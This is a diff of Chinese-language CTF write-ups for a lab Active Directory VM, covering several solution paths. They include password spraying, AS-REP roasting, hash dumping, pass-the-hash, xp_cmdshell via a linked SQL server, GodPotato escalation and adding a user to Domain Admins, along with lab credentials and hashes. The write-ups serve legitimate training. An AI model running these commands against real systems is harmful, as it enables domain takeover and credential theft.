-<font style="color:rgb(51, 51, 51);">因此本题最终的通关状态，不只是单机 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">SYSTEM</font>`<font style="color:rgb(51, 51, 51);">，而是完整的域控接管。</font>
+因此本题最终的通关状态，不只是单机 `SYSTEM`，而是完整的域控接管。
 
-## <font style="color:rgb(51, 51, 51);">关键命令汇总</font>
-<font style="color:rgb(51, 51, 51);">端口识别：</font>
+## 关键命令汇总
+端口识别：
 
-<font style="color:rgb(4, 30, 42);background-color:rgb(233, 242, 249);">nmap -Pn -sC -sV -T4 192.168.56.155</font>
+nmap -Pn -sC -sV -T4 192.168.56.155
 
-<font style="color:rgb(51, 51, 51);">弱口令喷洒：</font>
+弱口令喷洒：
 
-<font style="color:rgb(4, 30, 42);background-color:rgb(233, 242, 249);">netexec smb 192.168.56.155 -u /tmp/babydc_valid_users.txt -p /tmp/babydc_passwords.txt --continue-on-success</font>
+netexec smb 192.168.56.155 -u /tmp/babydc_valid_users.txt -p /tmp/babydc_passwords.txt --continue-on-success
 
-<font style="color:rgb(51, 51, 51);">LDAP 查询 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">mowen</font>`<font style="color:rgb(51, 51, 51);">：</font>
+LDAP 查询 `mowen`：
 
 ```plain
 ldapsearch -x -H ldap://192.168.56.155 \
@@ -2703,7 +2704,7 @@ ldapsearch -x -H ldap://192.168.56.155 \
   pwdLastSet description memberOf userAccountControl
 ```
 
-<font style="color:rgb(51, 51, 51);">AS-REP Roast：</font>
+AS-REP Roast：
 
 ```plain
 GetNPUsers.py XMCVE.local/ \
@@ -2715,15 +2716,15 @@ GetNPUsers.py XMCVE.local/ \
   -usersfile /tmp/mowen_only.txt
 ```
 
-<font style="color:rgb(51, 51, 51);">离线爆破：</font>
+离线爆破：
 
-<font style="color:rgb(4, 30, 42);background-color:rgb(233, 242, 249);">hashcat -m 18200 /tmp/mowen_asrep.hash /usr/share/wordlists/rockyou.txt --force</font>
+hashcat -m 18200 /tmp/mowen_asrep.hash /usr/share/wordlists/rockyou.txt --force
 
-<font style="color:rgb(51, 51, 51);">远程备份注册表：</font>
+远程备份注册表：
 
-<font style="color:rgb(4, 30, 42);background-color:rgb(233, 242, 249);">reg.py XMCVE.local/mowen:'1maxwell'@192.168.56.155 backup -o 'C:\Windows\Temp'</font>
+reg.py XMCVE.local/mowen:'1maxwell'@192.168.56.155 backup -o 'C:\Windows\Temp'
 
-<font style="color:rgb(51, 51, 51);">拉取 hive：</font>
+拉取 hive：
 
 ```plain
 netexec smb 192.168.56.155 -u mowen -p '1maxwell' --get-file 'Windows\Temp\SAM.save' /tmp/SAM.save
@@ -2731,11 +2732,11 @@ netexec smb 192.168.56.155 -u mowen -p '1maxwell' --get-file 'Windows\Temp\SYSTE
 netexec smb 192.168.56.155 -u mowen -p '1maxwell' --get-file 'Windows\Temp\SECURITY.save' /tmp/SECURITY.save
 ```
 
-<font style="color:rgb(51, 51, 51);">离线提取秘密：</font>
+离线提取秘密：
 
-<font style="color:rgb(4, 30, 42);background-color:rgb(233, 242, 249);">secretsdump.py -sam /tmp/SAM.save -system /tmp/SYSTEM.save -security /tmp/SECURITY.save LOCAL</font>
+secretsdump.py -sam /tmp/SAM.save -system /tmp/SYSTEM.save -security /tmp/SECURITY.save LOCAL
 
-<font style="color:rgb(51, 51, 51);">PTH 拿 SYSTEM：</font>
+PTH 拿 SYSTEM：
 
 ```plain
 psexec.py \
@@ -2744,7 +2745,7 @@ psexec.py \
   'whoami /all'
 ```
 
-<font style="color:rgb(51, 51, 51);">导出整域凭据：</font>
+导出整域凭据：
 
 ```plain
 secretsdump.py \
@@ -2752,26 +2753,26 @@ secretsdump.py \
   ./Administrator@192.168.56.155
 ```
 
-## <font style="color:rgb(51, 51, 51);">最终拿到的关键凭据</font>
-+ `<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">XMCVE\admin : Password123!</font>`
-+ `<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">XMCVE\support : Password123!</font>`
-+ `<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">XMCVE\mowen : 1maxwell</font>`
-+ `<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">XMCVE\sqlsvc : Sql!2026</font>`
-+ `<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">Administrator NTLM : d94f9831271e229dbc6e712097b63168</font>`
-+ `<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">krbtgt NTLM : 1e3c4fe72e1383c576b4b3aeef4730a8</font>`
+## 最终拿到的关键凭据
++ `XMCVE\admin : Password123!`
++ `XMCVE\support : Password123!`
++ `XMCVE\mowen : 1maxwell`
++ `XMCVE\sqlsvc : Sql!2026`
++ `Administrator NTLM : d94f9831271e229dbc6e712097b63168`
++ `krbtgt NTLM : 1e3c4fe72e1383c576b4b3aeef4730a8`
 
-## <font style="color:rgb(51, 51, 51);">复盘</font>
-<font style="color:rgb(51, 51, 51);">这题表面上看是一个带 IIS 和 MSSQL 的 Windows 主机，但真正的核心突破点并不是 Web，也不是 SQL，而是域用户属性和组权限设计。前面的统一弱口令只负责帮我们拿到一个能查询 LDAP 的入口，真正打通题目的关键是：</font>
+## 复盘
+这题表面上看是一个带 IIS 和 MSSQL 的 Windows 主机，但真正的核心突破点并不是 Web，也不是 SQL，而是域用户属性和组权限设计。前面的统一弱口令只负责帮我们拿到一个能查询 LDAP 的入口，真正打通题目的关键是：
 
-+ <font style="color:rgb(51, 51, 51);">先通过 LDAP 找到 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">mowen</font>`
-+ <font style="color:rgb(51, 51, 51);">再利用它的 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">DONT_REQ_PREAUTH</font>`
-+ <font style="color:rgb(51, 51, 51);">拿到 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">mowen</font>`<font style="color:rgb(51, 51, 51);"> 口令后再利用 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">Backup Operators</font>`
-+ <font style="color:rgb(51, 51, 51);">最终通过离线提取出来的管理员哈希完成 PTH</font>
++ 先通过 LDAP 找到 `mowen`
++ 再利用它的 `DONT_REQ_PREAUTH`
++ 拿到 `mowen` 口令后再利用 `Backup Operators`
++ 最终通过离线提取出来的管理员哈希完成 PTH
 
-<font style="color:rgb(51, 51, 51);">这条链路最大的优点是稳定，不依赖内存注入，不依赖复杂提权洞，也不依赖题目作者额外埋的 Web RCE。只要把账户属性和组权限利用对了，就能非常稳地一路走到 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">SYSTEM</font>`<font style="color:rgb(4, 30, 42);background-color:rgb(233, 242, 249);">  
-</font>
+这条链路最大的优点是稳定，不依赖内存注入，不依赖复杂提权洞，也不依赖题目作者额外埋的 Web RCE。只要把账户属性和组权限利用对了，就能非常稳地一路走到 `SYSTEM`  
 
-# <font style="color:rgb(4, 30, 42);background-color:rgba(233, 242, 249, 0.5);">Echoin</font><font style="color:#333333;">（</font><font style="color:rgb(20, 29, 34);background-color:rgb(245, 250, 255);">Zerologon</font><font style="color:rgb(0, 0, 0);">）</font><font style="color:#333333;">   </font>
+
+# Echoin（Zerologon）   
 配置好kali和vritualbox：
 
 VirtualBox 靶机 → Host-Only（192.168.56.x）  
@@ -3005,7 +3006,7 @@ impacket-psexec -hashes aad3b435b51404eeaad3b435b51404ee:d94f9831271e229dbc6e712
 
 ![](/image/myself%20machine/Castlevania-Unexpected-47.png)
 
-# <font style="color:rgb(4, 30, 42);background-color:rgba(233, 242, 249, 0.5);">k1ne(AI？)</font>
+# k1ne(AI？)
 > 很诡异的一篇wp，邮件中回复添加好友也是加的很迅速，询问wp中的问题时晾了我半个小时
 >
 > 四个问题的回复都是"ai打出来的，我啥也不知道"........真令我恼火
@@ -3016,73 +3017,73 @@ impacket-psexec -hashes aad3b435b51404eeaad3b435b51404ee:d94f9831271e229dbc6e712
 >
 > 其二：flag是在哪个位置拿到的？可否截个图
 >
-> 该选手对此回复："<font style="color:rgb(20, 29, 34);background-color:rgb(245, 250, 255);">镜像里指向的是C:\Users\Administrator\Desktop\flag.txt</font>"
+> 该选手对此回复："镜像里指向的是C:\Users\Administrator\Desktop\flag.txt"
 >
 > 但是flag我在上架环境前便删得一干二净且让他给我截图时选手对此保持沉默无视
 >
 > 其三：wp里也没有记录p2zhh，mowen的密码获取方式
 >
-> 该选手对此回复："<font style="color:rgb(20, 29, 34);background-color:rgb(245, 250, 255);">sql查出来的，镜像里都有，ai都能识别得到" </font>
+> 该选手对此回复："sql查出来的，镜像里都有，ai都能识别得到" 
 >
-> <font style="color:rgb(20, 29, 34);background-color:rgb(245, 250, 255);">？？？.....这句话一出我对这道题瞬间变得如此陌生</font>
+> ？？？.....这句话一出我对这道题瞬间变得如此陌生
 >
-> <font style="color:rgb(20, 29, 34);background-color:rgb(245, 250, 255);">其四：secretsdump出来的hash是如何转出明文的？</font>
+> 其四：secretsdump出来的hash是如何转出明文的？
 >
-> <font style="color:rgb(20, 29, 34);background-color:rgb(245, 250, 255);">该选手对此回复："明文是我先拿到哈希，然后镜像有一段明文，然后对比，哈希值一模一"</font>
+> 该选手对此回复："明文是我先拿到哈希，然后镜像有一段明文，然后对比，哈希值一模一"
 >
-> <font style="color:rgb(20, 29, 34);background-color:rgb(245, 250, 255);">后续：该选手因别的题导致出现在封神台中</font>
+> 后续：该选手因别的题导致出现在封神台中
 >
 
-## <font style="color:black;">镜像导入</font>
-<font style="color:#262626;">下载好镜像导⼊</font>
+## 镜像导入
+下载好镜像导⼊
 
 ![](/image/myself%20machine/Castlevania-Unexpected-48.jpeg)
 
 ## 信息收集
-<font style="color:#262626;">打开发现⽤户需要密码，猜测靶机启动了</font><font style="color:#262626;">web</font><font style="color:#262626;">服务尝试访问主机的⽹络信息，</font>
+打开发现⽤户需要密码，猜测靶机启动了web服务尝试访问主机的⽹络信息，
 
 ![](/image/myself%20machine/Castlevania-Unexpected-49.jpeg)
 
 ## 扫描端口
-<font style="color:#262626;">拿到关键信息</font>
+拿到关键信息
 
-<font style="color:#262626;">靶机ip是10.78.22.137，扫⼀下常⻅的端⼝ </font>
+靶机ip是10.78.22.137，扫⼀下常⻅的端⼝ 
 
 ![](/image/myself%20machine/Castlevania-Unexpected-50.jpeg)
 
-<font style="color:#262626;">发现存在⼀些服务，我在</font><font style="color:#262626;"> Kali </font><font style="color:#262626;">中使⽤</font><font style="color:#262626;"> nmap </font><font style="color:#262626;">扫描⽬标时，返回结果显示相关端⼝均为</font><font style="color:#262626;"> filtered</font><font style="color:#262626;">，可能是因为我</font><font style="color:#262626;">kali</font><font style="color:#262626;">在</font><font style="color:#262626;">vm</font><font style="color:#262626;">另⼀套⽹络⾥，可能有隔离。猜测开放了</font><font style="color:#262626;"> Web </font><font style="color:#262626;">与</font><font style="color:#262626;"> MSSQL </font><font style="color:#262626;">等服务。 </font>
+发现存在⼀些服务，我在 Kali 中使⽤ nmap 扫描⽬标时，返回结果显示相关端⼝均为 filtered，可能是因为我kali在vm另⼀套⽹络⾥，可能有隔离。猜测开放了 Web 与 MSSQL 等服务。 
 
-## <font style="color:#262626;">目录扫描</font>
-<font style="color:#262626;">访问⼀下</font>
+## 目录扫描
+访问⼀下
 
-<font style="color:#262626;">然后⽬录扫描⼀下有没有备份⽂件之类的</font>
+然后⽬录扫描⼀下有没有备份⽂件之类的
 
 ```plain
 dirsearch -u http://10.78.22.137/ -e txt,config,bak,old,zip
 ```
 
-<font style="color:#262626;">发现泄露了⽂件</font>
+发现泄露了⽂件
 
-[<font style="color:#117cee;">http://10.78.22.137/poo_connection.txt</font>](http://10.78.22.137/poo_connection.txt)
+[http://10.78.22.137/poo_connection.txt](http://10.78.22.137/poo_connection.txt)
 
 ![](/image/myself%20machine/Castlevania-Unexpected-51.jpeg)
 
-## Mssql登录&&<font style="color:#262626;">嵌套执行</font>
-<font style="color:#262626;">给出了mssql登录凭据尝试登录执⾏sql </font>![](/image/myself%20machine/Castlevania-Unexpected-52.png)
+## Mssql登录&&嵌套执行
+给出了mssql登录凭据尝试登录执⾏sql ![](/image/myself%20machine/Castlevania-Unexpected-52.png)
 
 ## 查看端口&&枚举用户
 ![](/image/myself%20machine/Castlevania-Unexpected-53.png)![](/image/myself%20machine/Castlevania-Unexpected-54.png)
 
-## <font style="color:#262626;">验证权限</font>
-<font style="color:#262626;">验证mowen身份权限 </font>![](/image/myself%20machine/Castlevania-Unexpected-55.png)![](/image/myself%20machine/Castlevania-Unexpected-56.png)![](/image/myself%20machine/Castlevania-Unexpected-57.png)![](/image/myself%20machine/Castlevania-Unexpected-58.png)
+## 验证权限
+验证mowen身份权限 ![](/image/myself%20machine/Castlevania-Unexpected-55.png)![](/image/myself%20machine/Castlevania-Unexpected-56.png)![](/image/myself%20machine/Castlevania-Unexpected-57.png)![](/image/myself%20machine/Castlevania-Unexpected-58.png)
 
-## <font style="color:#262626;">远程连接(失败)</font>![](/image/myself%20machine/Castlevania-Unexpected-59.png)
+## 远程连接(失败)![](/image/myself%20machine/Castlevania-Unexpected-59.png)
 ## 获取hash
-<font style="color:#262626;">写脚本进⾏远程拿⽂件在⼀个终端开启</font>
+写脚本进⾏远程拿⽂件在⼀个终端开启
 
 ![](/image/myself%20machine/Castlevania-Unexpected-60.png)
 
-<font style="color:#262626;">开另⼀个终端</font>
+开另⼀个终端
 
 ![](/image/myself%20machine/Castlevania-Unexpected-61.png)
 
@@ -3091,7 +3092,7 @@ dirsearch -u http://10.78.22.137/ -e txt,config,bak,old,zip
 ## 离线提取Administrator哈希
 ![](/image/myself%20machine/Castlevania-Unexpected-63.png)
 
-# Yarn<font style="color:#333333;">（</font><font style="color:rgb(20, 29, 34);background-color:rgb(245, 250, 255);">Zerologon</font><font style="color:rgb(0, 0, 0);">）</font><font style="color:#333333;">  </font>
+# Yarn（Zerologon）  
 ## 前置准备
 ### 先定义变量：
 ```plain
@@ -3266,8 +3267,8 @@ Administrator:des-cbc-md5:80584683e63d5845
 ```
 
 # 空白(土豆提权)
-## <font style="color:rgb(51, 51, 51);">题目分析</font>
-<font style="color:rgb(51, 51, 51);">靶机对外开放了 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">80</font>`<font style="color:rgb(51, 51, 51);">、</font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">445</font>`<font style="color:rgb(51, 51, 51);">、</font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">1433</font>`<font style="color:rgb(51, 51, 51);">、</font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">25</font>`<font style="color:rgb(51, 51, 51);">。</font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">80</font>`<font style="color:rgb(51, 51, 51);"> 口只有一个很简单的 IIS 默认站点，首页没有可利用逻辑，但站点目录里放了一个明文连接配置，直接给出 SQL 登录信息：</font>
+## 题目分析
+靶机对外开放了 `80`、`445`、`1433`、`25`。`80` 口只有一个很简单的 IIS 默认站点，首页没有可利用逻辑，但站点目录里放了一个明文连接配置，直接给出 SQL 登录信息：
 
 ```plain
 server=localhost;
@@ -3276,21 +3277,21 @@ password=lovlyBaby
 database=master
 ```
 
-<font style="color:rgb(51, 51, 51);">先用这组账号连接 SQL Server，可以看到当前登录只是 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">master</font>`<font style="color:rgb(51, 51, 51);"> 里的 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">guest</font>`<font style="color:rgb(51, 51, 51);">，本身不是 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">sysadmin</font>`<font style="color:rgb(51, 51, 51);">。问题的关键在 linked server。枚举 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">sys.servers</font>`<font style="color:rgb(51, 51, 51);"> 之后可以看到本机额外配置了两个 linked server：</font>
+先用这组账号连接 SQL Server，可以看到当前登录只是 `master` 里的 `guest`，本身不是 `sysadmin`。问题的关键在 linked server。枚举 `sys.servers` 之后可以看到本机额外配置了两个 linked server：
 
 ```plain
 SELECT name, product, provider, data_source, is_linked, is_remote_login_enabled
 FROM sys.servers;
 ```
 
-<font style="color:rgb(51, 51, 51);">结果里有：</font>
+结果里有：
 
 ```plain
 POO_CONFIG
 POO_PUBLIC
 ```
 
-<font style="color:rgb(51, 51, 51);">继续直接在 linked server 上执行查询，能看到两个 linked server 的远端上下文完全不同：</font>
+继续直接在 linked server 上执行查询，能看到两个 linked server 的远端上下文完全不同：
 
 ```plain
 EXEC ('SELECT @@SERVERNAME AS server_name,
@@ -3304,17 +3305,17 @@ EXEC ('SELECT @@SERVERNAME AS server_name,
              IS_SRVROLEMEMBER(''sysadmin'') AS is_sysadmin') AT POO_PUBLIC;
 ```
 
-<font style="color:rgb(51, 51, 51);">返回结果里：</font>
+返回结果里：
 
 ```plain
 POO_CONFIG -> current_login = poo_config, is_sysadmin = 0
 POO_PUBLIC -> current_login = sa,         is_sysadmin = 1
 ```
 
-<font style="color:rgb(51, 51, 51);">到这里利用链已经很清楚了。外部只要持有 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">wuwupor / lovlyBaby</font>`<font style="color:rgb(51, 51, 51);">，就能通过 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">POO_PUBLIC</font>`<font style="color:rgb(51, 51, 51);"> 借壳成 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">sa</font>`<font style="color:rgb(51, 51, 51);">。</font>
+到这里利用链已经很清楚了。外部只要持有 `wuwupor / lovlyBaby`，就能通过 `POO_PUBLIC` 借壳成 `sa`。
 
-## <font style="color:rgb(51, 51, 51);">SQL 利用</font>
-<font style="color:rgb(51, 51, 51);">确认配置项时还能看到 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">xp_cmdshell</font>`<font style="color:rgb(51, 51, 51);"> 已经开启：</font>
+## SQL 利用
+确认配置项时还能看到 `xp_cmdshell` 已经开启：
 
 ```plain
 SELECT name, CAST(value_in_use AS int) AS value_in_use
@@ -3322,51 +3323,51 @@ FROM sys.configurations
 WHERE name IN ('xp_cmdshell', 'Ole Automation Procedures', 'Ad Hoc Distributed Queries', 'clr enabled', 'remote access');
 ```
 
-<font style="color:rgb(51, 51, 51);">于是可以直接通过 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">POO_PUBLIC</font>`<font style="color:rgb(51, 51, 51);"> 执行系统命令：</font>
+于是可以直接通过 `POO_PUBLIC` 执行系统命令：
 
 EXEC ('EXEC xp_cmdshell ''whoami''') AT POO_PUBLIC;
 
-<font style="color:rgb(51, 51, 51);">返回身份是：</font>
+返回身份是：
 
 xmcve\sqlsvc
 
-<font style="color:rgb(51, 51, 51);">接着看权限：</font>
+接着看权限：
 
 EXEC ('EXEC xp_cmdshell ''whoami /priv''') AT POO_PUBLIC;
 
-<font style="color:rgb(51, 51, 51);">输出里最关键的一项是：</font>
+输出里最关键的一项是：
 
 SeImpersonatePrivilege    Enabled
 
-<font style="color:rgb(51, 51, 51);">这说明 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">sqlsvc</font>`<font style="color:rgb(51, 51, 51);"> 已经满足典型的本地提权条件，只差一条能把 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">SeImpersonatePrivilege</font>`<font style="color:rgb(51, 51, 51);"> 用起来的链。这里直接使用 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">GodPotato</font>`<font style="color:rgb(51, 51, 51);">，它对 Windows Server 2019 可用。</font>
+这说明 `sqlsvc` 已经满足典型的本地提权条件，只差一条能把 `SeImpersonatePrivilege` 用起来的链。这里直接使用 `GodPotato`，它对 Windows Server 2019 可用。
 
-## <font style="color:rgb(51, 51, 51);">系统提权</font>
-<font style="color:rgb(51, 51, 51);">利用思路非常直接：</font>
+## 系统提权
+利用思路非常直接：
 
-1. <font style="color:rgb(51, 51, 51);">用 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">xp_cmdshell</font>`<font style="color:rgb(51, 51, 51);"> 下发 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">GodPotato.exe</font>`
-2. <font style="color:rgb(51, 51, 51);">让 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">GodPotato</font>`<font style="color:rgb(51, 51, 51);"> 以 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">SYSTEM</font>`<font style="color:rgb(51, 51, 51);"> 身份执行一条命令</font>
-3. <font style="color:rgb(51, 51, 51);">把已知明文口令的 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">sqlsvc / Sql!2026</font>`<font style="color:rgb(51, 51, 51);"> 加进 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">Domain Admins</font>`
-4. <font style="color:rgb(51, 51, 51);">重新用 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">sqlsvc / Sql!2026</font>`<font style="color:rgb(51, 51, 51);"> 发起网络登录，直接拿管理员级远程会话</font>
+1. 用 `xp_cmdshell` 下发 `GodPotato.exe`
+2. 让 `GodPotato` 以 `SYSTEM` 身份执行一条命令
+3. 把已知明文口令的 `sqlsvc / Sql!2026` 加进 `Domain Admins`
+4. 重新用 `sqlsvc / Sql!2026` 发起网络登录，直接拿管理员级远程会话
 
-`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">GodPotato</font>`<font style="color:rgb(51, 51, 51);"> 先用 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">whoami</font>`<font style="color:rgb(51, 51, 51);"> 验证时，返回结果里已经能看到：</font>
+`GodPotato` 先用 `whoami` 验证时，返回结果里已经能看到：
 
 CurrentUser: NT AUTHORITY\SYSTEM
 
-<font style="color:rgb(51, 51, 51);">然后执行：</font>
+然后执行：
 
 net group "Domain Admins" sqlsvc /add /domain
 
-<font style="color:rgb(51, 51, 51);">命令成功后，重新使用 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">sqlsvc / Sql!2026</font>`<font style="color:rgb(51, 51, 51);"> 进行远程执行，就能拿到管理员级 shell。这里用 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">psexec</font>`<font style="color:rgb(51, 51, 51);"> 验证，返回结果是：</font>
+命令成功后，重新使用 `sqlsvc / Sql!2026` 进行远程执行，就能拿到管理员级 shell。这里用 `psexec` 验证，返回结果是：
 
 ```plain
 nt authority\system
 CASTLEVANIA
 ```
 
-<font style="color:rgb(51, 51, 51);">成功拿到admin shell</font>
+成功拿到admin shell
 
-## <font style="color:rgb(51, 51, 51);">Exp</font>
-<font style="color:rgb(51, 51, 51);">下面给出完整利用脚本。脚本会先连 SQL，确认 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">POO_PUBLIC</font>`<font style="color:rgb(51, 51, 51);"> 可用，然后临时开启一个本地 HTTP 服务，把同目录中的 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">GodPotato.exe</font>`<font style="color:rgb(51, 51, 51);"> 下发到目标，执行提权，再自动调用 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">psexec</font>`<font style="color:rgb(51, 51, 51);"> 拉起管理员 shell。</font>
+## Exp
+下面给出完整利用脚本。脚本会先连 SQL，确认 `POO_PUBLIC` 可用，然后临时开启一个本地 HTTP 服务，把同目录中的 `GodPotato.exe` 下发到目标，执行提权，再自动调用 `psexec` 拉起管理员 shell。
 
 ```plain
 import argparse
@@ -3541,57 +3542,57 @@ if __name__ == "__main__":
     raise SystemExit(main())
 ```
 
-# <font style="color:rgb(4, 30, 42);background-color:rgba(233, 242, 249, 0.5);">Wadding</font>(土豆提权)
-<font style="color:rgb(4, 30, 42);background-color:rgba(233, 242, 249, 0.5);">题面要求并不是提交在线环境里的字符串 flag，而是：</font>
+# Wadding(土豆提权)
+题面要求并不是提交在线环境里的字符串 flag，而是：
 
 ```latex
 对镜像本地搭建并渗透，拿到 Administrator shell，提交 WP 到邮箱审核，通过后才给官方 flag
 ```
 
-<font style="color:rgb(4, 30, 42);background-color:rgba(233, 242, 249, 0.5);">这台镜像里我已经拿到了 </font>`<font style="color:rgb(4, 30, 42);background-color:rgba(233, 242, 249, 0.5);">Administrator</font>`<font style="color:rgb(4, 30, 42);background-color:rgba(233, 242, 249, 0.5);"> 远程执行权限，当前可复现的管理员 shell 证明如下：</font>
+这台镜像里我已经拿到了 `Administrator` 远程执行权限，当前可复现的管理员 shell 证明如下：
 
 ```latex
 xmcve\administrator
 CASTLEVANIA
 ```
 
-<font style="color:rgb(4, 30, 42);background-color:rgba(233, 242, 249, 0.5);">另外，镜像里还残留了一个被删除的本地 flag 文本，在回收站文件内容中可恢复出：</font>
+另外，镜像里还残留了一个被删除的本地 flag 文本，在回收站文件内容中可恢复出：
 
 ```latex
 FLAG{XMCVE_Castlevania_Bloodlines_DA_Pwned}
 ```
 
-<font style="color:rgb(4, 30, 42);background-color:rgba(233, 242, 249, 0.5);">但要说明，这个并不是题面承诺的“官方比赛 flag”，因为题面明确说了官方 flag 要在提交 WP 审核后才发放。</font>
+但要说明，这个并不是题面承诺的“官方比赛 flag”，因为题面明确说了官方 flag 要在提交 WP 审核后才发放。
 
-## <font style="color:rgb(4, 30, 42);background-color:rgba(233, 242, 249, 0.5);">环境信息</font>
-<font style="color:rgb(4, 30, 42);background-color:rgba(233, 242, 249, 0.5);">题目给了本地 OVA：</font>
+## 环境信息
+题目给了本地 OVA：
 
 ```latex
 D:\Install\Bloodstained.ova
 ```
 
-<font style="color:rgb(4, 30, 42);background-color:rgba(233, 242, 249, 0.5);">导入后我把机器改成：</font>
+导入后我把机器改成：
 
-+ `<font style="color:rgb(4, 30, 42);background-color:rgba(233, 242, 249, 0.5);">NIC1 = Host-Only</font>`
-+ `<font style="color:rgb(4, 30, 42);background-color:rgba(233, 242, 249, 0.5);">NIC2 = NAT</font>`
++ `NIC1 = Host-Only`
++ `NIC2 = NAT`
 
-<font style="color:rgb(4, 30, 42);background-color:rgba(233, 242, 249, 0.5);">这样宿主机可以直接访问客机。</font>
+这样宿主机可以直接访问客机。
 
-<font style="color:rgb(4, 30, 42);background-color:rgba(233, 242, 249, 0.5);">客机关键信息：</font>
+客机关键信息：
 
-+ <font style="color:rgb(4, 30, 42);background-color:rgba(233, 242, 249, 0.5);">主机名：</font>`<font style="color:rgb(4, 30, 42);background-color:rgba(233, 242, 249, 0.5);">CASTLEVANIA</font>`
-+ <font style="color:rgb(4, 30, 42);background-color:rgba(233, 242, 249, 0.5);">域名：</font>`<font style="color:rgb(4, 30, 42);background-color:rgba(233, 242, 249, 0.5);">XMCVE.local</font>`
-+ <font style="color:rgb(4, 30, 42);background-color:rgba(233, 242, 249, 0.5);">Web：</font>`<font style="color:rgb(4, 30, 42);background-color:rgba(233, 242, 249, 0.5);">80/tcp</font>`
-+ <font style="color:rgb(4, 30, 42);background-color:rgba(233, 242, 249, 0.5);">MSSQL：</font>`<font style="color:rgb(4, 30, 42);background-color:rgba(233, 242, 249, 0.5);">1433/tcp</font>`
-+ <font style="color:rgb(4, 30, 42);background-color:rgba(233, 242, 249, 0.5);">LDAP / AD：</font>`<font style="color:rgb(4, 30, 42);background-color:rgba(233, 242, 249, 0.5);">389, 445, 88 ...</font>`
++ 主机名：`CASTLEVANIA`
++ 域名：`XMCVE.local`
++ Web：`80/tcp`
++ MSSQL：`1433/tcp`
++ LDAP / AD：`389, 445, 88 ...`
 
-<font style="color:rgb(4, 30, 42);background-color:rgba(233, 242, 249, 0.5);">通过 Guest Additions 和网络探测确认到：</font>
+通过 Guest Additions 和网络探测确认到：
 
-+ <font style="color:rgb(4, 30, 42);background-color:rgba(233, 242, 249, 0.5);">Host-only 网卡：</font>`<font style="color:rgb(4, 30, 42);background-color:rgba(233, 242, 249, 0.5);">169.254.212.20</font>`
-+ <font style="color:rgb(4, 30, 42);background-color:rgba(233, 242, 249, 0.5);">NAT 网卡：</font>`<font style="color:rgb(4, 30, 42);background-color:rgba(233, 242, 249, 0.5);">10.0.3.15</font>`
++ Host-only 网卡：`169.254.212.20`
++ NAT 网卡：`10.0.3.15`
 
-## <font style="color:rgb(4, 30, 42);background-color:rgba(233, 242, 249, 0.5);">攻击面梳理</font>
-<font style="color:rgb(4, 30, 42);background-color:rgba(233, 242, 249, 0.5);">首页只有一个静态维护页：</font>
+## 攻击面梳理
+首页只有一个静态维护页：
 
 ```html
 <h1>Employee Portal</h1>
@@ -3599,13 +3600,13 @@ D:\Install\Bloodstained.ova
 
 ```
 
-<font style="color:rgb(4, 30, 42);background-color:rgba(233, 242, 249, 0.5);">看起来没什么内容，但离线查看 VMDK 后发现 </font>`<font style="color:rgb(4, 30, 42);background-color:rgba(233, 242, 249, 0.5);">inetpub\wwwroot</font>`<font style="color:rgb(4, 30, 42);background-color:rgba(233, 242, 249, 0.5);"> 下除了 </font>`<font style="color:rgb(4, 30, 42);background-color:rgba(233, 242, 249, 0.5);">index.html</font>`<font style="color:rgb(4, 30, 42);background-color:rgba(233, 242, 249, 0.5);"> 之外还有一个非常关键的文件：</font>
+看起来没什么内容，但离线查看 VMDK 后发现 `inetpub\wwwroot` 下除了 `index.html` 之外还有一个非常关键的文件：
 
